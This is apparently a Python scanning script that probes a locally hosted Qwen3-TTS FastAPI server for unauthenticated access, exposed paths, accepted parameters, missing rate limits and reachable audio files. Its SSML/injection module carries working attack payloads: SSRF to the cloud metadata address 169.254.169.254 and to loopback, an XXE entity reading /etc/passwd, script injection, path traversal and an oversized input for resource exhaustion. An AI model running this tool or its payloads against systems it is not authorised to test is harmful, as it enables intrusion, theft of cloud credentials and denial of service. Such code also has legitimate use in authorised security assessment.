#!/usr/bin/env python3
"""
Qwen3-TTS Ablation Module
Target: mlx-community/Qwen3-TTS-12Hz-0.6B-Base-8bit on macOS/MLX (port 2023)
API: uvicorn/FastAPI, POST /tts form-encoded, returns audio/wav
"""

import urllib.request
import urllib.error
import urllib.parse
import json
import time
import threading
import hashlib
import struct
import os

BASE = os.environ.get("QWEN3_TTS_TARGET", "http://localhost:2023")
FINDINGS = []

def log(sev, title, detail, evidence=None):
    e = {"severity": sev, "title": title, "detail": detail, "ts": time.time()}
    if evidence:
        e["evidence"] = evidence
    FINDINGS.append(e)
    print(f"[{sev}] {title}")
    if evidence:
        print(f"      {str(evidence)[:120]}")


def _post_tts(text, extra_params=None, timeout=60):
    """POST /tts with form data. Returns (status, headers, body_bytes)."""
    params = {"text": text}
    if extra_params:
        params.update(extra_params)
    data = urllib.parse.urlencode(params).encode()
    req = urllib.request.Request(
        f"{BASE}/tts", data=data, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read()
            return r.status, dict(r.headers), body
    except urllib.error.HTTPError as e:
        body = e.read()
        return e.code, dict(e.headers), body
    except Exception as ex:
        return 0, {}, str(ex).encode()


def _get(path, timeout=10):
    try:
        req = urllib.request.Request(f"{BASE}{path}")
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as ex:
        return 0, str(ex).encode()


def module_health():
    """M1: Health endpoint — full system state disclosure."""
    code, body = _get("/health")
    if code == 200:
        data = json.loads(body)
        model = data.get("hot_loaded_model_ids", [])
        instance = data.get("instance_id")
        started = data.get("process_started_at")
        mlx_active = data.get("memory", {}).get("mlx_active_bytes", 0)
        log("HIGH", "Unauthenticated health endpoint exposes system state",
            f"model={model} instance_id={instance} started={started} mlx_active={mlx_active/1e9:.2f}GB",
            body.decode()[:500])
        return data
    return {}


def module_unauth_synthesis():
    """M2: Confirm unauth synthesis — compute theft."""
    code, hdrs, body = _post_tts("hello world")
    if code == 200 and hdrs.get("Content-Type", "").startswith("audio/"):
        size = len(body)
        fname = hdrs.get("Content-Disposition", "")
        log("HIGH", "Unauthenticated TTS synthesis (compute theft)",
            f"HTTP 200, {size} bytes WAV, Content-Disposition: {fname}",
            f"POST /tts text=hello+world -> audio/wav {size}b")
        return body
    log("INFO", "M2 synthesis check", f"code={code} body={body[:100]}")
    return None


def module_path_enum():
    """M3: Enumerate all registered paths."""
    paths = [
        "/", "/tts", "/health", "/docs", "/openapi.json", "/redoc",
        "/v1/tts", "/v1/audio/speech", "/models", "/voices", "/speakers",
        "/stream", "/ws", "/generate", "/synthesize", "/clone", "/upload",
        "/api", "/api/v1", "/status", "/metrics", "/info", "/version",
        "/admin", "/config", "/settings", "/reload", "/restart",
        "/tts/stream", "/tts/ws", "/tts/voices",
    ]
    found = []
    for path in paths:
        code, body = _get(path, timeout=5)
        if code not in (404, 0):
            found.append((path, code, len(body)))
            log("MED", f"Non-404 path discovered: {path}",
                f"HTTP {code}, {len(body)} bytes", body[:100].decode(errors='replace'))
    return found


def module_ssml_injection():
    """M4: SSML and XML injection in text field."""
    payloads = [
        # SSML basic
        ('<speak>hello world</speak>', 'ssml_basic'),
        # SSML audio src (potential SSRF)
        ('<speak><audio src="http://169.254.169.254/latest/meta-data/"></audio></speak>', 'ssml_ssrf_imds'),
        ('<speak><audio src="http://127.0.0.1:8080/internal"></audio></speak>', 'ssml_ssrf_loopback'),
        # Prosody injection
        ('<speak><prosody rate="fast">DEADBUG</prosody></speak>', 'ssml_prosody'),
        # XXE-style
        ('<?xml version="1.0"?><!DOCTYPE speak [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><speak>&xxe;</speak>', 'xxe'),
        # Script injection (some TTS engines eval JS for phoneme)
        ('Hello<script>alert(1)</script>World', 'script_inject'),
        # Path traversal in text
        ('Hello../../../../etc/passwd World', 'path_traverse_text'),
        # Very long text (resource exhaustion)
        ('a ' * 5000, 'long_text_10k_chars'),
        # Null bytes
        ('hello\x00world', 'null_byte'),
        # Unicode homoglyphs
        ('hеllо wоrld', 'unicode_homoglyph'),  # Cyrillic chars
    ]

    results = {}
    baseline_code, _, baseline_body = _post_tts("hello world")
    baseline_size = len(baseline_body)

    for text, label in payloads:
        code, hdrs, body = _post_tts(text, timeout=30)
        size = len(body)
        ct = hdrs.get("Content-Type", "")
        is_audio = ct.startswith("audio/")
        diff = size - baseline_size

        if code == 200 and is_audio:
            status = "AUDIO"
        elif code == 200:
            status = "200_NON_AUDIO"
        elif code in (500, 503):
            status = f"ERROR_{code}"
        elif code == 422:
            status = "VALIDATION_REJECTED"
        else:
            status = f"HTTP_{code}"

        results[label] = {"code": code, "size": size, "status": status, "ct": ct}

        # Flag interesting cases
        if code >= 500:
            log("HIGH", f"Server error on SSML/injection payload: {label}",
                f"HTTP {code}", body[:200].decode(errors='replace'))
        elif label == 'ssml_ssrf_imds' and code == 200:
            log("CRIT", "SSML audio src SSRF to IMDS responded with audio!",
                f"HTTP {code}, {size}b — target may have fetched IMDS URL",
                body[:50].hex())
        elif label == 'ssml_basic' and code == 200 and is_audio:
            log("MED", "SSML tags accepted (not stripped)",
                "TTS engine may process SSML markup",
                f"size={size} vs baseline={baseline_size} diff={diff}")
        elif label == 'xxe' and code == 200 and size > baseline_size + 100:
            log("CRIT", "Possible XXE — response larger than baseline",
                f"size={size} baseline={baseline_size}",
                body[:100].hex())

        print(f"  [{label}] {status} {size}b (diff={diff:+d})")

    return results


def module_param_discovery():
    """M5: Discover additional accepted parameters via error reflection."""
    # Send valid text but add extra params to see which are accepted vs rejected
    extra_params_to_test = [
        "voice", "speaker", "speaker_id", "model", "model_id",
        "speed", "rate", "pitch", "volume", "language", "lang",
        "output_format", "format", "sample_rate", "bits", "channels",
        "temperature", "top_p", "seed", "stream", "streaming",
        "callback_url", "webhook", "ssml", "phoneme", "style",
        "emotion", "gender", "age", "accent",
    ]

    accepted = []
    for param in extra_params_to_test:
        code, hdrs, body = _post_tts("hello", extra_params={param: "test_value"}, timeout=10)
        # If it causes a different error (not the generic missing-text 422), the param is recognized
        if code == 200:
            ct = hdrs.get("Content-Type", "")
            if ct.startswith("audio/"):
                accepted.append((param, "AUDIO_OUTPUT"))
                log("MED", f"Extra param accepted, audio returned: {param}=test_value",
                    f"HTTP 200 audio/{len(body)}b")
        elif code == 422:
            err = body.decode(errors='replace')
            if "test_value" in err or param in err:
                accepted.append((param, f"VALIDATED: {err[:80]}"))
                log("MED", f"Parameter recognized by validator: {param}",
                    err[:100])

    return accepted


def module_race_condition():
    """M6: Concurrent synthesis — rate limiting / DoS surface."""
    results = []
    lock = threading.Lock()

    def synthesize(i):
        t0 = time.time()
        code, hdrs, body = _post_tts(f"concurrent request number {i}", timeout=30)
        elapsed = time.time() - t0
        with lock:
            results.append({"i": i, "code": code, "size": len(body), "elapsed_s": round(elapsed, 2)})

    threads = [threading.Thread(target=synthesize, args=(i,)) for i in range(5)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=60)

    success = sum(1 for r in results if r["code"] == 200)
    errors = sum(1 for r in results if r["code"] >= 500)
    avg_time = sum(r["elapsed_s"] for r in results) / max(len(results), 1)

    if errors == 0:
        log("MED", "No rate limiting — 5 concurrent synthesis requests all succeeded",
            f"success={success} errors={errors} avg_latency={avg_time:.1f}s")
    else:
        log("INFO", f"Concurrent test: {success}/5 success, {errors} errors, avg={avg_time:.1f}s",
            str(results))

    return results


def module_file_enum():
    """M7: Enumerate generated audio files — predictable filenames, IDOR."""
    # From headers: Content-Disposition: attachment; filename="audio_d5f6b03f.wav"
    # The filename appears to be a random hex string. Check if files are served.
    known_file = "audio_d5f6b03f.wav"  # from earlier synthesis
    test_paths = [
        f"/files/{known_file}",
        f"/audio/{known_file}",
        f"/static/{known_file}",
        f"/tmp/{known_file}",
        f"/output/{known_file}",
        f"/{known_file}",
        "/files/",
        "/audio/",
        "/static/",
        "/output/",
    ]

    found = []
    for path in test_paths:
        code, body = _get(path, timeout=5)
        if code == 200:
            found.append((path, len(body)))
            log("HIGH", f"Audio file directly accessible: {path}",
                f"HTTP 200, {len(body)} bytes",
                body[:4].hex() if body else "empty")
    return found


def run_all():
    print("=" * 60)
    print(f"Qwen3-TTS Ablation — {BASE}")
    print("=" * 60)

    print("\n[M1] Health endpoint")
    health = module_health()

    print("\n[M2] Unauth synthesis")
    audio = module_unauth_synthesis()

    print("\n[M3] Path enumeration")
    paths = module_path_enum()

    print("\n[M4] SSML/injection payloads")
    ssml = module_ssml_injection()

    print("\n[M5] Parameter discovery")
    params = module_param_discovery()

    print("\n[M6] Race condition / rate limit")
    race = module_race_condition()

    print("\n[M7] File enumeration / IDOR")
    files = module_file_enum()

    print("\n" + "=" * 60)
    print(f"FINDINGS ({len(FINDINGS)}):")
    for f in FINDINGS:
        print(f"  [{f['severity']}] {f['title']}")
    print("=" * 60)

    return {
        "target": BASE,
        "service": "Qwen3-TTS (mlx-community/Qwen3-TTS-12Hz-0.6B-Base-8bit)",
        "findings": FINDINGS,
        "paths": paths,
        "ssml_results": ssml,
        "accepted_params": params,
        "race_results": race,
        "accessible_files": files,
    }


if __name__ == "__main__":
    import json as _json
    result = run_all()
    outfile = f"/tmp/qwen3_tts_ablation_{int(time.time())}.json"
    with open(outfile, "w") as f:
        _json.dump(result, f, indent=2, default=str)
    print(f"\nResults saved to {outfile}")
